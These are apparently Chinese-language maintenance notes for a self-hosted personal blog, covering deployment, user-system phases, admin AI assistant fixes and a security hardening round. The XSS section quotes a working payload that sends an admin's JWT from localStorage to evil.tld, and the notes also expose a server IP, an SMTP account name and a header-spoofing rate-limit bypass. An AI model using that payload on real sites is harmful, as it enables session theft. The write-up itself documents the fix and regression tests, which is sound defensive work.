# 博客维护约定

维护对象：千禧的个人博客 DevLog / My_Blog，域名 `https://blog.qianxi7988.me`。
本文件写的是 2026-09-24 只读核对 + 当日迁移 + **2026-09-28 用户系统二/三期上线**后的真实状态。每条线上结论都有当次命令输出；没打过的接口不要写成"已验证"。

仓库：`qianxi-00/My_Blog`，默认分支 `master`。本地克隆 `C:\Users\QianXi\.dsh-ops\blog\My_Blog`（HEAD `f8dac7e`）。
当前生产镜像 **`qianxi-blog:users9`**（2026-09-30 五期之三「修 DetachedInstanceError」版）。前端产物 `assets/index-kBQz4WVk.js`、助手 chunk `AgentChat-Cq69Vs_7.js`。`8f1aac5` / `23e310a` / `86c3ad5` / `469e5a8` / `6d641e5` / `4d0d92b` / `46715bb` / `3a7c27a` / `86d880c` / `c3adca1` / `4164dcb` / `87b4fbf` / `ec8d545` / `f8dac7e` **均已推 GitHub**，`origin/master` = `f8dac7e`。回滚用 `/data/blog/rollback.sh <镜像tag>`（只换镜像、不碰数据库，见「已知缺口」）。

⚠️ **传前端包必须校验 md5**：`ssh_runner.py put` 出现过「传了但服务器上还是旧包」的情况（2026-09-30 至少两次，症状是部署脚本报 `DEPLOY_OK` 但线上 chunk hash 没变）。现流程固定为：本地算 md5 → 上传 → 服务器比对 md5 → 不一致直接中止。脚本 `b_deploy_fe_md5.sh`（本地 `C:\Users\QianXi\.dsh-ops\blog\`）。

## 先看这里（2026-09-24 迁移后）

- **生产已从 HF+Cloudflare Worker 迁到主服务器 `101.32.163.17` 自建**。DNS `blog.qianxi7988.me` A 记录直指 `101.32.163.17`、灰云（不过 Cloudflare 代理）。
- 博客容器、nginx 配置、证书、备份都在主服务器上，见下文「现行生产」。旧栈（HF Space + Worker）保留作回退，仍可经 `qianxi-blog-site.1964055097.workers.dev` 访问。
- **绝不在主服务器上跑前端构建**（npm/vite 会把 3.6G 内存的机器打挂，2026-09-24 已实测 OOM 一次）。前端只在本地构建，产物分批上传。
- **绝不往 HF Space 推代码**：免费层 `/data` 不持久，每次重建都会用 `data/db_part_*.dat` 重置线上库（2026-09-24 实测确认，view_count 从 13 回落 10）。
- `README.md` / `DEPLOY.md` 里的 Nginx+MySQL+Redis 是旧方案；`API_INVENTORY.md` 是 2026-03-19 的旧扫描。现行合同看线上 OpenAPI。
- 本机 Windows + pwsh；可用 Python 只有 `F:\ProGramApp\Anaconda\python.exe`。远程 Linux 用 bash。`F:\ProGram\DSH_Temporary` 会被清，成果不放那里。
- 动手前说明打算、原因、影响，确认后再执行。删数据、改生产、推代码：先备份再问。没有接口输出不说完成。密钥只记位置不写明文。

## 现行生产（2026-09-24 起）

```
用户 → https://blog.qianxi7988.me （DNS 灰云直连）
        └─ nginx (101.32.163.17)
            ├─ /api/        → 127.0.0.1:8000 → docker 容器 qianxi-blog (uvicorn :7860)
            ├─ /uploads/    → 静态文件 /var/www/blog/dist/uploads（try_files，不转后端）
            └─ 其它         → /var/www/blog/dist（React 构建产物，SPA fallback）
```

| 组件 | 位置 / 事实 |
|---|---|
| 后端容器 | `qianxi-blog`，镜像 **`qianxi-blog:users5`**（2026-09-30 四期「XSS 收口 + 契约补齐 + 首屏性能」版；构建源 = 提交 `86c3ad5` 的 `git archive HEAD backend` 导出树）。1GiB/`--cpus 2`，uvicorn **`--workers 2 --proxy-headers --forwarded-allow-ips='*'`**（GIL 决定单进程最多 1 核，多核必须多 worker；docker run 时用 CMD 覆盖参数，镜像 CMD 仍是单 worker 供 HF 兼容；**proxy-headers 不能漏，限流靠它拿真实访客 IP**）。`--restart unless-stopped`，`blog-net`，只绑 `127.0.0.1:8000`。**回退用 `bash /data/blog/rollback.sh <镜像tag>`**（只换镜像、不碰数据库、失败自动退回原镜像）。历史镜像仍在：`users4` → `users3` → `users2` → `users1` → `arag2` → `20260924` |
| 并发优化（2026-09-24 实测） | SQLite 已切 **WAL**（`app/core/database.py` 连接事件监听自动 PRAGMA：journal_mode=WAL + synchronous=NORMAL + busy_timeout=5000；写不再锁全库）；aiosqlite 方言默认 NullPool，已显式 `AsyncAdaptedQueuePool`（pool_size=20/max_overflow=30）；bcrypt 登录验证改 `asyncio.to_thread`（原先同步 100-300ms 阻塞事件循环）；A-RAG SSE 有并发护栏 `asyncio.Semaphore(8)`/worker（双 worker 合计 16 路，超限回友好提示）。压测（ab，同机 2 核）：1worker/1CPU=42.7rps/750ms → 2worker/2CPU=70.6rps/453ms（直连）、62.6rps/0 错误（公网 HTTPS 全路径）。单请求 ~15ms；剩余上限是宿主机 2 核本身，再要翻倍只能升配或加只读副本 |
| A-RAG 聊天 | 公开问答已从 PoroRagAgent 伪流式升级为 **LangChain create_agent**（2026-09-24）。新端点 `POST /api/v1/chat/message/agentic`（SSE，事件 `reasoning`/`tool_start`/`tool_result`/`text`/`done`/`error`）。实现：`backend/app/services/arag_agent.py`（5 个检索工具：文章/证据块/读窗口/读全文/热点；工具**各自开独立 DB 会话**，因为 ToolNode 并行调用工具）；`ReasoningChatOpenAI` 子类负责把网关 `delta.reasoning_content` 透传进事件流（langgraph v3 messages 通道不透传，靠子类回调直推 SSE 队列）。旧端点 `/chat/message/stream`（Poro 伪流式）保留给桌宠主动气泡。前端 `DesktopPet` 聊天面板 + `AgentProcessStrip` 渲染思考/工具芯片。**nginx /api/ 已加 `proxy_buffering off`（SSE 依赖，别删）**。注意 `openai` SDK 已升 `3.19.2`（langchain-openai 1.6.6 要求 >=2.45） |
| 数据库 | 容器挂载宿主机 `/data/blog/data` → 容器 `/data`；库文件 = 容器内 **`/data/blog.db`** = 宿主机 `/data/blog/data/blog.db`（WAL，见并发优化行）。2026-09-24 从 HF 导出（integrity ok：23 文 / 567 热点 / 558 published） |
| 前端 | `/var/www/blog/dist`，本地构建后上传（**打包必须排除 `uploads/`、`data/`、`live2d/`，由 `deploy_frontend_dist.sh` 做 union 保留**）；uploads 53 个文件齐全。当前产物 `assets/index-DxUGmAU9.js`（**325,486 B，gzip 实传 103,958 B**；98 个 chunk 按需加载；2026-09-30 四期：路由级 lazy + 封面图懒加载 + XSS 消毒）。旧主包仍留在 dist（避免强缓存用户白屏）。Live2D 是死代码未上传（见已知缺口 1），站点宠物为静态 DesktopPet |
| nginx | `/etc/nginx/sites-available/blog`（独立文件，别动 `new-api` 那份）。80 端口有 `^~ /.well-known/acme-challenge/` 例外 + 301，**别删这个例外，删了证书续不了**。⚠️ **`/api/` 的 `proxy_set_header X-Forwarded-For` 必须是 `$remote_addr`（覆写），不能是 `$proxy_add_x_forwarded_for`（追加）**——否则客户端自带 XFF 头即可伪造来源 IP，绕过按 ip 的限流（本期新增的登录限流首当其冲）。见「用户系统三期」与「待办」8 |
| 证书 | Let's Encrypt `blog.qianxi7988.me`，2026-12-23 到期，certbot 自动续期（webroot=`/var/www/blog/dist`） |
| 运行配置 | `/data/blog/runtime.env`（600 root-only）：JWT_SECRET_KEY（强随机，2026-09-24 轮换）、`LLM_MODEL_CHAIN=grok-4.7`、`REDIS_ENABLED=false`、NewAPI 地址 `http://new-api:3000/v1` |
| 备份 | `/data/blog/backup-db.sh`，cron 每天 04:30 热备份到 `/data/blog/backups/`，保留 14 天 |
| AI 日报 | `/data/blog/scripts/fetch_ai_daily.py` + `/etc/cron.d/blog-ai-daily`：每 30 分钟拉 `aihot.virxact.com` 公共 API，直写 `/var/www/blog/dist/data/`（2026-09-24 恢复；此前新旧站都冻结在 2026-07-09，因为旧机制随 openclaw/旧服务器消亡）。日志 `/data/blog/logs/ai-daily-fetch.log` |
| 提示词同步 | `/data/blog/scripts/sync_coze_prompts.py` + `/etc/cron.d/blog-coze-sync`：每天 05:10 拉扣子（api.coze.cn）机器人人设提示词 → 公开投稿接口入库 `pending`，后台审核后上架。PAT 在 `/data/blog/coze.env`（600 root-only，**最长 30 天过期**，过期后日志记 401，去扣子后台重新生成覆盖该文件即恢复）。状态 `/data/blog/coze-sync-state.json`（title+sha256 去重），日志 `/data/blog/logs/coze-prompt-sync.log` |
| AI 网络桥 | docker 网络 `blog-net`：`qianxi-blog` 与 `new-api` 都挂在上面。**拆掉这个网络 AI 就断**（new-api 只发布在宿主机 `127.0.0.1:3001`，容器从 `172.17.0.1` 够不到，2026-09-24 实测 Connection refused）。**2026-09-28 起这个挂载是持久的**：`/data/new-api-stack/docker-compose.yml` 的 `new-api` 服务声明了 `networks: [default, blog-net]` + 顶层 `networks: blog-net: external: true`，所以 `docker compose up -d` 重建 new-api 不会再丢掉它（此前是手工 `docker network connect`，重建即断）。改前备份在 `/data/new-api-stack/backup/pre-blognet-20260928-173637/`，重建实测中断 2.74 秒、mysql/redis 未重建 |

## 用户系统（2026-09-26 上线，镜像 `qianxi-blog:users2`）

- **`users` 是全站唯一人员表**：管理员已并入（保留原 `admins.id`：`qianxi`=1、`admin`=3，均 `super_admin`/`active`）。`admins` 表**停用但不删不重命名**（SQLite 外键重排风险）。角色 `user/admin/super_admin`，状态 `active/banned`，密码哈希两者同构（bcrypt），旧管理端口令照用。
- **权限只信数据库行**：token 里只有 `sub=user_id`，角色每次请求从 `users` 读；封禁用户下一次请求即 401/403。
- **投稿审核流**：`draft → pending_review →(管理员) published/rejected`。用户端点 `POST/PUT /api/v1/users/me/articles`、`POST …/{id}/submit`、`DELETE …/{id}`；管理端点 `GET /api/v1/articles/review/pending`、`PUT /api/v1/articles/{id}/review`（驳回必须带非空 `review_note`，重复审核返回 400）。非 `pending_review` 的文章不出现在公开列表。
- **评论双轨**：登录用户评论写 `user_id`（展示账号昵称/头像），访客匿名评论不变；删评论限本人或管理员，越权 403。`CommentResponse` 增加 `user_id/username/user_display_name`。
- **注册**：默认开放，站点设置 `user_registration_enabled`（`true/false`，`PUT /api/v1/settings/…`）可随时关；用户名 `^[a-zA-Z0-9_-]{3,30}$`、密码 ≥8 位、邮箱选填且不校验。
- **作者邮箱脱敏**：`AuthorResponse` 对 `role=user` 的作者把 email 置空，管理员联系方式保留。
- **限流**（`backend/app/core/ratelimit.py`，进程内计数、**每 worker 独立**，故双 worker 实际额度≈2×）：评论 5 次/分/IP、投稿提交 3 次/天/用户、注册 5 次/小时/IP。
- ⚠️ **限流依赖真实访客 IP**：uvicorn 必须带 `--proxy-headers --forwarded-allow-ips='*'`（nginx 已传 `X-Real-IP`/`X-Forwarded-For`）。漏了参数时容器只看到 docker 网关 IP，**全站共用一个限流桶**（2026-09-26 实测踩过）。
- 迁移脚本 `/data/blog/migrate_users.py`（一次性：admins→users 保 id、重建 articles 表加 `pending_review/rejected` 与 `review_note`、comments 补 `user_id` 并回填；库中已有 `users` 表则拒绝执行）。**迁移必须在应用停止时做**。迁移前库备份：`/data/blog/backups/pre-user-system-20260926-204453/`。
- **回退**（旧脚本已废弃，勿用）：`rollback_users.sh` 会在 `set -eu` 下先删容器再整库覆盖，中途失败即站点全挂，现已改为 `rollback_users.sh.deprecated`。**现行用 `bash /data/blog/rollback.sh qianxi-blog:users4`**（只换镜像、不动数据库、起不来自动退回原镜像）。
- 管理后台新增两个 tab（`frontend/pages/AdminDashboard.tsx` + `frontend/components/UserAdminPanels.tsx`）：「用户文章审核」通过/驳回、「用户管理」搜索/封禁/解封。
- 验收脚本（服务器 `/data/blog/scripts/acceptance/`，本机留档 `C:\Users\QianXi\.dsh-ops\blog\`）：`e2e_users.py`（52 项端到端，跑法 `python3 e2e_users.py http://127.0.0.1:8001`，需先起演练容器）、`logout_probe.py`（登出四态）、`load_ka.py`（保活压测）、`public_regression.sh`（公网回归）。**别放 /tmp**：重启即失。
- 上线当天验收证据（全部当次现跑）：E2E 在最终镜像 `users2` 上 **52/0**；登出探针 5/0（普通用户 200，此前是 403）；生产 UI 实走 注册→投稿→（后台）审核→公网可见；公网保活压测 **73.3rps / p50 374ms / 0 错**（并发优化基线 62.6rps 公网、70.6rps 直连）。

**回退方式**：把 Cloudflare DNS 的 A 记录改回橙云代理（原 Worker 路由 `blog.qianxi7988.me/* → qianxi-blog-site` 仍在）。数据回退需注意：新站库从导出后一直在被写（浏览量、聊天），回退前先备份新库。

## 用户系统二期：三级权限 + 邮箱认证（2026-09-28 上线，镜像 `qianxi-blog:users3`）

**权限矩阵（`user` / `admin` / `super_admin`）**——判据只有一条：**数据库里的 `users.role`**（token 只带 `sub=user_id`）。

| 能力 | user | admin | super_admin |
|---|---|---|---|
| 增删改**自己**的文章（草稿/待审范围内） | ✅ | ✅ | ✅ |
| 删**自己**的评论 | ✅ | ✅ | ✅ |
| 删**别人**的评论 | ❌ 403「只能删除自己的评论」 | ✅ | ✅ |
| 审核文章（通过/驳回） | ❌ | ✅ | ✅ |
| 封禁/解封用户、重置其密码、看用户列表与详情 | ❌ | ✅ | ✅ |
| 改角色、改他人邮箱、删用户、管理员账号管理 | ❌ | ❌ | ✅ |
| 增删改**自己**的提示词投稿（仅 `pending`/`rejected`） | ✅ | ✅ | ✅ |
| 提示词审核/删除任意提示词 | ❌ | ✅ | ✅ |

- **管理入口搬成侧栏独立页**：`/admin/users`（前端 `pages/AdminAccounts.tsx`，侧栏「用户与权限」）。后台仪表盘的旧 tab（用户管理/管理员账号）已移除，能力全部平移到该页：统计卡、状态/角色筛选、搜索（含邮箱）、排序（注册时间/最后登入/文章数）、详情抽屉（`components/UserDetailDrawer.tsx`：改角色、重置密码、绑定邮箱、封禁、删除）、管理员账号增删改密。
- **最后登入时间**：`users.last_login_at`，登录成功时写（`auth.py` 登录分支）。列表与详情都展示。
- **改密踢会话**：`users.password_changed_at` 由自助改密/重置密码写；`deps.get_current_user` 比对 token 的 `iat`（`core/security.py` 里 `iat` 必须是**浮点秒**——曾经用 `int()` 截断，导致「同一秒内改完密码再登录」被自己签发的 token 判为过期而 401，`044dd6b` 修掉）。
- **邮箱认证**（对齐主服务器 new-api 的做法）：`services/verification_service.py` + `email_codes` 表（存 sha256(code)，10 分钟有效、最多试 5 次、60 秒重发冷却、单邮箱 5 次/天、单 IP 10 次/小时）。用途三类：注册、重置密码、绑邮箱。
  - **注册强制邮箱验证**（站点设置 `email_verification_required=true`；置 false 可退回一期「只填用户名口令」）。两步式：`POST /auth/register/code` 发码 → `POST /auth/register` 带 `code` 落地。
  - **自助重置密码**：`POST /auth/password/reset/code`（对不存在的邮箱**也返回 200**，防枚举）→ `POST /auth/password/reset`。
  - **绑定/更换邮箱**：`POST /users/me/email/code` + `PUT /users/me/email`。
  - **白名单**：`email_domain_whitelist`（站点设置，逗号分隔，空=不限）与 new-api 保持一致：`gmail.com,163.com,126.com,qq.com,icloud.com,foxmail.com`。
  - **SMTP 走主服务器 new-api 那套 Brevo relay**（`smtp-relay.brevo.com:465`，账号 `aaa2f9001@smtp-brevo.com`，发件 `noreply@qianxi7988.me`）。**凭据只在 `/data/blog/runtime.env`（600）里，密文不落库不进 Git**；`SMTP_HOST/PORT/USER/PASSWORD/FROM_EMAIL/FROM_NAME/USE_TLS` 七个键。发信是 stdlib smtplib（阻塞）→ `asyncio.to_thread`；发失败会回滚验证码并返回「邮件发送失败，请稍后再试」。
- **提示词投稿改为登录用户投稿**：`POST /prompts/submit` 需登录（`get_current_user`），提交者从账号取（不再让前端填昵称），限流 **3 次/天/用户**；新增用户自域接口 `GET/PUT/DELETE /users/me/prompts[/{id}]`（只能动自己的，且只限 `pending`/`rejected`）。**`prompts.author_id` 外键已从 `admins.id` 改指 `users.id`**（`scripts/migrate_users_v3.py` 重建表，25 行零改动迁移）。
- **删用户的语义（别照文档想当然）**：`Article.author_id` 是 **NOT NULL**（模型与线上库一致），所以文章**不能**「归属置空保留」。当前实现：该用户有文章时 `DELETE /admins/users/{id}` 返回 **409** 并附文章/评论/提示词数量，前端抽屉显示说明 + 「连同其文章一起删除」二次确认（`?with_content=true`）；确认后逐篇走 ORM `db.delete()`（与 `DELETE /articles/{id}` 同路径）+ 清文章缓存。评论/提示词可空，仍按**置空保留**。守卫：不能删自己、不能删最后一个超管。
- ⚠️ **外键级联在这里是假的**：`core/database.py` 只设了 WAL/synchronous/busy_timeout，**从未 `PRAGMA foreign_keys=ON`**，SQLite 默认关闭 → 模型里的 `ondelete="CASCADE"` 不生效。删行必须走 ORM 关系或手工清子表，**不要**用批量 `delete(Article)`。
- **迁移脚本** `/data/blog/migrate_users_v3.py`（幂等，可反复跑）：users 加三列（`email_verified`/`last_login_at`/`password_changed_at`）+ 建 `email_codes`（2 索引）+ 回填有邮箱的存量账号 `email_verified=1` + 重建 `prompts` 表把 FK 指到 `users.id`。**必须在应用停止时跑**。切换前备份：`/data/blog/backups/pre-v2-20260928-163845/`（27MB，integrity ok）。
- **回退**：`bash /data/blog/rollback_users2_v2.sh /data/blog/backups/pre-v2-20260928-163845`（停容器 → 还原库 → 起 `qianxi-blog:users2`）。前端回退文件留在 `/data/blog/backups/frontend-pre-v2-20260928-163845/index.html`（旧主包仍在 dist，无需回滚包）。
- **限流新增**：注册发码/绑邮箱发码 10 次/小时/IP、自助重置 5 次/小时/IP、提示词投稿 3 次/天/用户。**双 worker 各持一份进程内桶 → 实际额度约 2×**（验收脚本据此探测 429，不要写死"第 4 次必被拦"）。
- **验收脚本**（服务器 `/data/blog/scripts/acceptance/`，本机留档 `C:\Users\QianXi\.dsh-ops\blog\`）：`e2e_users.py`、`e2e_email_auth.py`、`e2e_admin_users.py`（跑法 `python3 <脚本> <base_url> <db_path> [容器名]`），配套 `run_all_e2e.sh`（重建演练容器后三套连跑，必须先重建：限流桶是进程内的，不重建会吃上一轮的 429）。**别放 /tmp**：重启即失，而且 **`/tmp` 上跑不了 WAL 模式的 SQLite**（-shm 需要 mmap/共享内存支持，实测 `disk I/O error` → `readonly database`；演练库和副本一律放 `/data` 或 `/root`）。
- **上线验收证据（2026-09-28 当次现跑）**：演练容器 `users3` 上三套 **users 55/0 + email 46/0 + admin 101/0**；**生产**（`127.0.0.1:8000` + 真实库）email **46/0**、admin **101/0**，跑后库无 e2e 残留（users 2 / 文章 23 / 评论 42 / 提示词 25，integrity ok）；公网回归全 200（首页/文章/标签/分类/归档/提示词/设置/热点/logo/ai-daily），`/admins/users` 未登录 401；A-RAG 流式事件正常（`text`/`done`/`tool_*`）。

## 五期：后台 AI 助手（`/#/admin/ai-agent`）修复 + Cherry Studio 式界面（2026-09-30，镜像 `qianxi-blog:users7`）

一句话：**这个助手其实一直完全不可用**——所有技能都调不通，打开就 500。修了三个互相叠加的根因，并把界面重做成聊天工作台。提交 `5d6bba4` / `46715bb` / `3a7c27a`。

### 一、三个根因（都在同一条链路上，缺一不可）

| # | 现象 | 根因 | 修法 |
|---|---|---|---|
| 1 | 所有技能调用返回 500 | `call_api` 拼的基地址用 `settings.APP_PORT`（默认 **8000**），但容器内 uvicorn 监听 **7860**（8000 只是宿主机映射进来的端口）→ 每一次调用都 Connection refused。**宿主机 curl 8000 通、容器内 7860 通，两条路各自都"看起来正常"**，所以一直没暴露 | 新增 `SERVER_PORT` 配置专表容器内真实监听端口，`internal_base()` 用它 |
| 2 | 技能全部 404 | skill 里大量写成 `"/articles/"`、`"/comments/"`，路由注册的是 `"/articles"`（无尾斜杠）。Starlette **不会**为 router prefix 下的路径自动重定向，实测直接 404 | `normalize_path` 统一去尾斜杠、折叠重复斜杠 |
| 3 | `GET /agent/sessions` **整个 500** | 上游网关返回的 `function.arguments` **本身就是转义过的字符串**，直接入库变成二次转义（`{\\"days\\":7}`）→ 非法 JSON。而 `AgentSession.messages` 是 `lazy="selectin"`，查会话列表就会连带反序列化所有消息，**一条坏数据就让整个接口 500**，界面直接打不开 | 三处一起修：`LenientJSON` 类型（坏 JSON 返回 None 而非抛异常）+ `normalize_tool_arguments()` 入库前规范化 + 一次性修历史数据（已修 5 行，库已备份到 `pre-agent-json-fix-20260930-152552`） |

**顺带修掉的一个隐性 bug**：根因 3 的双重转义同时导致 `json.loads(arguments)` 失败 → 工具执行时 `parsed_args = {}` → **所有需要参数的技能（`manage_article` / `manage_comment` / `get_daily_stats(days=N)` 等）一直拿到空参数**。这个不报任何错，只是"效果不好"，比 500 更难发现。

### 二、补齐的会话接口

- `PATCH /agent/sessions/{id}`：会话重命名（原先 PUT/PATCH 都是 405，界面根本改不了名字）
- `GET /agent/sessions?keyword=&limit=`：搜索 + 限量，并回传 `message_count`
- ⚠️ 实现坑：消息数用 `outerjoin + group_by` 在 SQLAlchemy 2.0 下编译不过（同时 select 整实体又 group_by 主键）；已改成 `correlate` 的标量子查询。

### 三、界面（`frontend/pages/AgentChat.tsx` 重写）

- **思考过程与工具调用绑定到「消息轮次」（Turn）**，不再放全局 state——原先多轮对话时新一轮的思考会覆盖上一轮，且无法像聊天软件那样内联在回答上方
- 用户消息右对齐气泡；助手消息带头像；工具调用做成可折叠卡片（技能=青色 / 工具=琥珀色），显示入参与结果
- 侧栏：搜索、**按今天/昨天/近 7 天/更早分组**、hover 显示重命名与删除、每项带相对时间与消息数
- 空状态引导 + 4 个建议问题；**Enter 发送 / Shift+Enter 换行**（原先只有 Ctrl+Enter）；流式"停止生成"；输入框自适应高度
- `Icons` 补 `Plus` / `Pencil` / `Trash2`

### 四、验证（生产实测）

- **工具真的通了**：`get_site_overview` 返回 `{"ok": true, "status_code": 200, "url": "http://127.0.0.1:7860/api/v1/stats/overview", "data": {"total_articles": 23, "total_comments": 42, ...}}`，与库内计数一致；`get_daily_stats` 同样 200
- 最近 25 条消息的 `arguments`：可解析 11、非法 0
- 接口：会话列表 200 / 详情 200 / 重命名 200 / 搜索命中与空结果均 200
- **真机（Chrome）**：界面无白屏，侧栏分组与消息数正确，工具卡片可展开显示真实 JSON
- 上游模型侧确认正常：`finish_reason: tool_calls`，`AGENT_MODEL = grok-4.7`，`base = http://new-api:3000/v1`

### 五、界面二次美化（用户反馈"有点丑"，镜像 users8）

用户看到的第一版不好看，主要是**工具卡片展开就是一坨 `JSON.stringify`**，最抢眼也最难读。改动都在展示层，逻辑没动：

- 工具结果：成功时给人话摘要（关键指标 + 条数），原始 JSON 收进「原始数据」折叠区；失败时才摊开错误，并把 `127.0.0.1:7860` 显示成「本机」
- 指标与入参全部中文化：`today_views → 今日访问`、`article_id → 文章 ID`，兜底用 `humanizeKey()`（snake_case 拆词）；`{}` 空参数不显示
- 用户消息从青底白字（刺眼）改为中性浅底气泡
- 助手回答加专用排版常量 `PROSE`（用 className 注入，**不动全站共用的 MarkdownContent**，改了会波及文章页）：标题层次、列表缩进、代码块深色卡片、表格斑马纹、引用左框、行高 1.75
- 正文与输入区 `max-w-4xl`（`max-w-3xl` 在后台布局里两侧留白过多）
- 工具配色 amber → violet，与头像渐变呼应；思考块/头像/侧栏选中态/空状态统一为更克制的风格

**真机 DOM 复验**（比截图可靠，截图工具的 DPR 缩放会误导）：折叠头「技能 站点概览 完成」→ 摘要「5 今日访问 · 1 今日访客 · 23 文章总数 · 42 评论总数 · 0 待审评论 · 16 今日 AI 调用」；表格表头全中文。

### 六、SSE 与依赖 teardown 的时序坑（`DetachedInstanceError`，镜像 users9）

**症状**：后台 AI 助手发消息后，助手气泡里直接显示
`Instance <AgentSession at 0x...> is not bound to a Session; attribute refresh operation cannot proceed`。

**根因**（踩了两次才定位到，完整记下来）：

1. FastAPI 的 `StreamingResponse`，**依赖清理是在响应开始发送后执行的，不等生成器跑完**。
2. 所以在 `get_db` 的 `finally` 里加任何会 detach 对象的操作，都会让 SSE 生成器**第一行之前**就失效。
3. 而 `service.py` 在 `db.commit()` 之后仍读 `session.id` / `session.title` —— `commit` 默认 `expire_on_commit=True`，访问过期属性会触发 refresh，打到已 close 的 session 上就炸。

**我犯的错**：为了让一次 `database is locked` 消失，在 `get_db` 里加了 `await session.rollback()`。
**事后查明那次锁死不是产品缺陷** —— 是我自己的演练容器 `DATABASE_URL` 没隔离、连到了生产库（`e2e_setup_users3.sh` 只建了 `e2e-users5.db` 文件，没改环境变量），加上 `docker exec` 里崩溃的 python 留下的悬挂事务。
**为一次性、由自己操作造成的故障去改核心依赖，是这次两个线上 bug 的根源。**

**最终修法**（`get_db` 保持原样，只在代码里留一条警告注释说明为什么不能加 rollback）：

- `chat_stream` 入口把 `session_id` / `current_title` 存成局部变量，整个流不再碰 ORM 对象
- 自动命名改走 `UPDATE` 语句，而不是给对象赋值
- `api/v1/agent.py` 同样把 `session_id`、`current_admin.role` 提前取出
- **`api/v1/chat.py` 的 `/message/stream` 有完全相同的 4 处**（`session.id` ×2、`session.title =` 等），一并改掉 —— A-RAG 桌宠聊天是同款雷
- 异常不再只转成 SSE 事件：补 `logger.exception`，否则线上出问题日志里什么都没有

**验证**：在用户那个已有 14 条历史的真实会话上发消息（正是报错的那条路径）→ `event: done`、Detached 错误 0、工具真调用、回答为真实数据（23 篇 / 42 条）；新会话路径同样正常；浏览器里实发一条消息，`hasDetached: false`。自动命名也生效了（会话标题已变成首条提问）。

### 七、遗留

1. **演练容器必须显式指定独立 `DATABASE_URL`**：`e2e_setup_users3.sh` 只建库文件不改 env，容器仍连生产库。已因此锁死过一次。**用之前先确认这个脚本的 env 处理。**
2. **会话无归属**：`agent_sessions` 是后台专用（admin 才能访问），暂不加归属字段。
3. **验证 AI 助手需要 admin token**：目前靠服务器签发 30 分钟短期 JWT + 临时引导页 `_t.html`（用完即删，已确认 `/_t.html` 回退到 index.html 不含 token）。若要长期做界面回归，建议加一个仅本地可用的调试入口。

## 用户系统四期：XSS 收口 + 契约补齐 + 首屏性能（2026-09-30，镜像 `qianxi-blog:users5`）

一句话：**堵掉一条能偷走管理员 JWT 的存储型 XSS，补齐三处前后端契约断链，把首屏 JS 从 2.88MB 压到 0.32MB**。提交 `86c3ad5` / `469e5a8` / `6d641e5`（均已推 GitHub）。

### 一、存储型 XSS（此前无人发现，危害最高）

- **根因**：`components/MarkdownContent.tsx` 的 `allowHtml` 默认值是 `true`，且开启时挂 `rehypeRaw` 解析原始 HTML，**全链路没有任何消毒**（无 `rehype-sanitize` / DOMPurify）。
- **打法**：匿名评论创建即 `status="approved"`（`comments.py`），只需
  `POST /api/v1/comments/article/{id}` 带 `<img src=x onerror="fetch('//evil.tld/?t='+localStorage.getItem('access_token'))">`，
  管理员打开自己文章即触发 → 拿走 24 小时有效的 JWT → 接管超管会话。
- **为什么是遗漏而非设计**：热点评论、论坛、Agent 聊天**全都显式传了 `allowHtml={false}`**，只有文章评论这一条漏了。
- **修法**：默认值改成 `false`（安全默认）、所有用户可提交内容的渲染点显式传 `false`、新增 `rehype-sanitize` 并**排在 katex/highlight 之前**（它们自己生成的 class 才不被剥掉）、文章正文显式开 `allowHtml` 但仍过消毒。协议白名单只留 `http/https/mailto`。
- **回归测试**：`frontend/__tests__/xss-regression.test.ts`（`npx vitest run`，5 条：事件属性、`<script>`、`javascript:`、正文开 HTML 仍被消毒、正常图片链接不被误伤）。

### 二、前后端契约断链（前端在调、后端没有/对不上）

| 症状 | 根因 | 修法 |
|---|---|---|
| 访问 `/#/article/{slug}` 恒 404 | `api/articles.ts` 的 `getArticleBySlug` 一直在调 `/articles/slug/{slug}`，**后端没有这条路由** | 补路由。⚠️ **必须注册在 `/{article_id}` 之前**，否则被 int 转换吃掉报 422。`articles.slug` 目前全站无写入路径（恒 null），属"先补齐契约" |
| 作者主页整页白屏 | 前端 `PublicUserProfile` 声明成 `{user, articles}`，后端 `UserProfilePublic` 是**扁平**结构 → `profile.user.display_name` 抛 TypeError | 类型改 `extends PublicAuthor`，取值改 `profile` |
| 桌宠/看板娘聊天历史永远加载不出来且**不报错** | `get_session_history` 函数**没有路由装饰器**是死函数，前端异常被 try/catch 吞掉 | 补路由 + 归属校验 |

### 三、chat / prompt 的匿名面收紧

- `chat_sessions` **没有任何归属字段** → `DELETE /chat/session/{id}` 任意匿名可删任意会话，往他人会话写消息还会把其历史喂进 LLM。补 `user_id` + `owner_ip` 两列（`core/database.py: ensure_schema_columns()` 幂等 ALTER，**挂在 lifespan 上、不能挂 `settings.DEBUG`**——生产 `DEBUG=false`，挂错地方新代码上线直接 500）+ 归属判定。
- 提示词详情端点**零 status 过滤** → 匿名遍历 id 就能读 pending/rejected 全文（列表端点是有 `status=="approved"` 过滤的）。访客/普通用户只读已通过审核的。
- chat 与 prompt-lab **无任何限流** → 未认证即可无限放大模型费用。补进程内限流（chat 20/分钟、chat message 6/分钟、prompt-lab 10/分钟）。
- `prompt_lab` 把 `str(e)` 回显给调用方（可能带上游地址/密钥片段）→ 改为只记日志。

### 四、首屏性能（真机 Chrome 冷缓存实测）

| 项 | 改前 | 改后 |
|---|---|---|
| 入口主包（原始） | 3,017,034 B | **325,486 B**（-89.2%） |
| 入口主包（gzip 实传） | 3,017,034 B（**gzip_types 被注释，等于没开**） | **103,958 B**（-96.6%） |
| 首页 DCL | 913 ms | **343 ms** |
| 文章页传输 | 1,360 KB | **788 KB** |
| 作者页传输 | 7,754 KB | **2,709 KB**（封面图懒加载，-65%） |

- `App.tsx` 33 个页面全静态 import → 改 `React.lazy` 路由级分割（产物 1 个 chunk → 98 个，首页只加载 6 个）。
- `nginx.conf` 的 **`gzip_types` 整行被注释**（nginx 默认只压 text/html，JS/CSS/JSON 全不压缩）→ 补全 16 种类型；带 hash 的静态资源加 `immutable` 缓存头。**brotli 没加**（`nginx -V` 实测无该模块，加了 `nginx -t` 会失败）。
- 封面图全站零 `loading="lazy"` → 文章列表/作者页/侧栏补上；首页首图保持 `eager`（首屏可见，lazy 反而更慢）。

### 五、部署链的四处数据丢失风险（都已修，务必知道）

`deploy_frontend_dist.sh` 连续三次翻车，每次都靠脚本自带的 `trap ERR` 回滚保住数据：

1. **`APP_ROOT` 与 nginx root 不一致** —— 脚本写 `/data/My_Blog/frontend/dist`，nginx 读 `/var/www/blog/dist`，**产物一直写进没人读的目录**，线上跑的是两天前的包。已改为以 nginx root 为准，旧路径做软链。
